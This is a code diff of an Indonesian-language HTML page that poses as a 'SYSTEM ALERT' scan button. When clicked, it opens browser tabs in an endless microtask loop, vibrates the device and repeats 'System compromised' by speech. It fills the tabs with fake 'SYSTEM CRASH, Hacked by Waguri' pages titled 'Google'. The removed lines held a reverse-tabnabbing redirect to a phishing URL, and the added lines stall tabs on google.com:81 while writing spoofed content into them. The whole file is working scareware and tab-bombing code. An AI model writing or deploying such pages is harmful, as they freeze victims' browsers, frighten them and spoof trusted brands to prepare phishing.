@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>One-Click Race Condition + Reverse Tabnabbing</title>
+<title>Port Spoofing Delay (Port 81)</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -20,7 +20,7 @@ button:disabled { background: #555; cursor: not-allowed; }
 <body>
 <div class="panel" id="main-panel">
     <h1>⚠️ SYSTEM ALERT</h1>
-    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (Race Condition + Reverse Tabnabbing).</p>
+    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (Port Spoofing Delay).</p>
     
     <button id="start-btn" type="button">Mulai Pemindaian</button>
     
@@ -33,10 +33,9 @@ const statusDiv = document.getElementById("status");
 
 let isProcessing = false;
 
-// Fungsi TTS & Getar
 function efekHacker() {
     if (navigator.vibrate) {
-        navigator.vibrate([1000, 200, 1000, 200, 1000, 200, 1000]);
+        navigator.vibrate([1000, 200, 1000, 200, 1000]);
     }
     if ('speechSynthesis' in window) {
         window.speechSynthesis.cancel();
@@ -53,90 +52,67 @@ startBtn.addEventListener("click", function() {
     startBtn.disabled = true;
     startBtn.textContent = "Sistem Terkunci...";
 
-    // Jalankan efek getar dan suara di halaman utama
     efekHacker();
 
     let dipicu = 0;
-    statusDiv.textContent = "Memicu One-Click Race Condition...";
+    statusDiv.textContent = "Memicu Port Spoofing via Race Condition...";
 
-    // RACE CONDITION: Looping Tanpa Henti
     function picuTerusMenerus() {
         dipicu++;
         try {
             // Membuka tab kosong
             const w = window.open('about:blank', '_blank');
             
-            // SUNTIKKAN KODE KE TAB BARU
             if (w) {
                 try {
-                    w.document.write(`
-                        <!DOCTYPE html>
-                        <html>
-                        <head><title>Google</title></head>
-                        <body style="margin:0;padding:0;background:#000;color:#f00;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace;text-align:center;">
-                            <div>
-                                <h1 style="font-size:60px; text-shadow:0 0 20px #f00;">SYSTEM CRASH</h1>
-                                <p style="color:#0f0; font-size:20px;">Hacked by Waguri</p>
-                                <p id="status" style="color:#ff0; font-size:12px; margin-top:20px;">Memicu Race Condition...</p>
-                            </div>
-                            <script>
-                                // --- REVERSE TABNABBING ---
-                                // Membelokkan halaman utama (opener) ke situs lain
-                                try {
-                                    if (window.opener) {
-                                        window.opener.location.href = 'https://example.com/phishing';
-                                    }
-                                } catch(e) {
-                                    // Chrome modern memblokir akses lintas origin (tergantung pengaturan)
-                                }
-
-                                // Getar Sangat Lama (Looping di dalam tab baru)
-                                if (navigator.vibrate) {
-                                    setInterval(function() {
-                                        navigator.vibrate([2000, 500, 2000]);
-                                    }, 3000);
-                                }
-                                // Suara TTS diulang
-                                if ('speechSynthesis' in window) {
-                                    setInterval(function() {
-                                        var msg = new SpeechSynthesisUtterance('System compromised');
-                                        msg.lang = 'en-US';
-                                        window.speechSynthesis.speak(msg);
-                                    }, 4000);
-                                }
-
-                                // --- RACE CONDITION DI DALAM TAB BARU ---
-                                var dipicuAnak = 0;
-                                function picuAnak() {
-                                    dipicuAnak++;
-                                    try {
-                                        var wAnak = window.open('about:blank', '_blank');
-                                        if (wAnak) {
-                                            wAnak.document.write('<h1 style="color:red;font-family:monospace;text-align:center;margin-top:20%">SYSTEM CRASH</h1>');
-                                            wAnak.document.close();
-                                        }
-                                    } catch(e) {}
-                                    
-                                    document.getElementById('status').textContent = 'Membuka tab anak ke-' + dipicuAnak;
-                                    queueMicrotask(picuAnak);
-                                }
-                                // Jalankan Race Condition di tab anak setelah 1 detik
-                                setTimeout(picuAnak, 1000);
-                            <\/script>
-                        </body>
-                        </html>
-                    `);
-                    w.document.close();
+                    // --- TRIK PORT DELAY (Menggunakan Port 81) ---
+                    // Port 81 jarang sekali digunakan untuk HTTPS, sehingga browser akan timeout lama
+                    w.location.href = 'https://google.com:81';
+                    
+                    let count = 0;
+                    let intv = setInterval(function() {
+                        count++;
+                        try {
+                            // Suntikkan konten "SYSTEM CRASH" saat browser tertahan
+                            w.document.write(`
+                                <!DOCTYPE html>
+                                <html>
+                                <head><title>Google</title></head>
+                                <body style="margin:0;padding:0;background:#000;color:#f00;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace;text-align:center;">
+                                    <div>
+                                        <h1 style="font-size:60px; text-shadow:0 0 20px #f00;">SYSTEM CRASH</h1>
+                                        <p style="color:#0f0; font-size:20px;">Hacked by Waguri</p>
+                                        <p style="color:#ff0; font-size:12px; margin-top:20px;">Port Spoofing Active (Port 81)</p>
+                                    </div>
+                                </body>
+                                </html>
+                            `);
+                        } catch(e) {}
+                        
+                        // Hentikan setelah 3 detik
+                        if (count > 30) { clearInterval(intv); }
+                    }, 100);
+                    
+                    // Trigger Race Condition Anak
+                    setTimeout(function() {
+                        try {
+                            const wAnak = window.open('about:blank', '_blank');
+                            if (wAnak) {
+                                wAnak.location.href = 'https://google.com:81';
+                                wAnak.document.write('<h1 style="color:red;font-family:monospace;text-align:center;margin-top:20%">SYSTEM CRASH</h1>');
+                                wAnak.document.close();
+                            }
+                        } catch(e) {}
+                    }, 1000);
+                    
                 } catch(e) {}
             }
-            statusDiv.textContent = `Membuka tab utama ke-${dipicu}...`;
+            statusDiv.textContent = `Membuka tab spoofing ke-${dipicu}...`;
         } catch(e) {}
 
-        // Panggil dirinya sendiri via Microtask
         queueMicrotask(picuTerusMenerus);
     }
 
-    // Mulai Looping
     queueMicrotask(function() {
         queueMicrotask(function() {
             picuTerusMenerus();
